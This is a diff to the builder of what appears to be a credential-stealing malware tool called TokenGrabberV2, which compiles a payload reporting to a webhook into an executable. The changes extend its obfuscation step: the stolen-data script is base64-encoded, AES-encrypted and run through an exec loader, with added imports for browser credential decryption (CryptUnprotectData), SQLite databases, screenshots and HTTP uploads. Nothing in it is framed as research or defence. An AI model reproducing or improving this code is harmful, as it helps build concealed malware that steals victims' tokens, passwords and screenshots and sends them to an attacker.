@@ -33,7 +33,7 @@ def TokenGrabberV2(WebHook, fileName):
 
     print(f"Do you want to obfuscate {fileName}.exe?")
     yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}y/n: {Fore.RED}')
-    if yesno.lower() == "y":
+    if yesno.lower() == "y" or yesno.lower() == "yes":
         IV = Random.new().read(AES.block_size)
         key = u''
         for i in range(8):
@@ -44,7 +44,7 @@ def TokenGrabberV2(WebHook, fileName):
         with open(f'{fileName}.py', "wb") as f:
             encodedBytes = base64.b64encode(_file.encode())
             obfuscatedBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(encodedBytes)
-            f.write(f'from Crypto.Cipher import AES;exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())
+            f.write(f'import requests;import os;import shutil;import sqlite3;import zipfile;import json;import base64 ;import psutil;from PIL import ImageGrab;from win32crypt import CryptUnprotectData;from re import findall;from Crypto.Cipher import AES;exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())
 
     print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
     setTitle(f"Creating {fileName}.exe")
@@ -58,6 +58,7 @@ def TokenGrabberV2(WebHook, fileName):
         '--icon=NONE',
     ])
     try:
+        #clean build files
         shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
         shutil.rmtree('build')
         shutil.rmtree('dist')
